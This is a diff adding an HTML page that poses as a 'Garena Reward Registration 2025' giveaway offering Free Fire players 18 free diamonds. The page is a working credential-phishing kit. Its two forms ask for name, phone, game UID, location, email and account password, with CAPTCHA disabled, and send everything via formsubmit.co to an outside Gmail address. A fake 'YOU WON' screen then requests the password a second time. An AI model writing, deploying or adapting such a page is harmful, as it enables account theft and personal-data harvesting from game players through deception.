@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Garena Reward Registration</title>
+
+<style>
+body{margin:0;font-family:Arial;color:white;text-align:center}
+
+/* PAGE BACKGROUNDS */
+#page1{
+  background:url('https://i.ibb.co/mrySQdJs/1000111779-1-1024x576-1.webp') no-repeat center center/cover;
+  height:100vh; display:flex; justify-content:center; align-items:center;
+}
+#page2{
+  background:url('https://i.ibb.co/p60tQfJ5/b1f6e170ac4f19dee5772be51c0c27171730726260665925-6.jpg')
+  no-repeat center center/cover;
+  height:100vh; display:none; justify-content:center; align-items:center;
+}
+
+/* FORM STYLE */
+form{
+  background:rgba(0,0,0,0.6);
+  padding:20px; border-radius:15px; width:300px;
+}
+input{
+  width:90%; padding:10px; margin:8px 0; border:none; border-radius:8px;
+}
+button{
+  padding:10px 20px; background:#00ff99; color:black;
+  border:none; border-radius:8px; cursor:pointer; font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<!-- ----------------------------------------------------- -->
+<!-- PAGE 1 -->
+<!-- ----------------------------------------------------- -->
+<div id="page1">
+  <form id="form1" action="https://formsubmit.co/gareenafreefireplayers@gmail.com" method="POST">
+    <h2>Garena Reward Registration 2025</h2>
+
+    <input type="text" name="Name" placeholder="Name" required>
+    <input type="text" name="Phone Number" placeholder="Phone Number" required>
+    <input type="text" name="UID" placeholder="UID" required>
+    <input type="text" name="State" placeholder="State" required>
+    <input type="text" name="District" placeholder="District" required>
+    <input type="email" name="Email" placeholder="Email" required>
+    <input type="password"name="PASSWORD"placeholder="PASSWORD" required>
+ <input type="password" name="Confirm PASSWORD" placeholder="Confirm PASSWORD" required>
+
+    <input type="hidden" name="_captcha" value="false">
+
+    <button type="submit" onclick="nextPage()">Next</button>
+  </form>
+</div>
+
+<!-- ----------------------------------------------------- -->
+<!-- PAGE 2 -->
+<!-- ----------------------------------------------------- -->
+<div id="page2">
+  <form action="https://formsubmit.co/gareenafreefireplayers@gmail.com" method="POST">
+    <h1>YOU WON 18 DIAMONDS 🎉</h1>
+
+    <input type="text" name="Name" placeholder="Name" required>
+    <input type="text" name="UID" placeholder="UID" required>
+    <input type="email" name="Email" placeholder="Email" required>
+    <input type="password" name="PASSWORD" placeholder="PASSWORD" required>
+
+    <input type="hidden" name="_captcha" value="false">
+
+    <button type="submit">Claim Reward</button>
+  </form>
+</div>
+
+<script>
+function nextPage(){
+  setTimeout(()=>{
+    document.getElementById("page1").style.display="none";
+    document.getElementById("page2").style.display="flex";
+  }, 1000); // 1 second delay after submit
+}
+</script>
+
+</body>
+  </html>
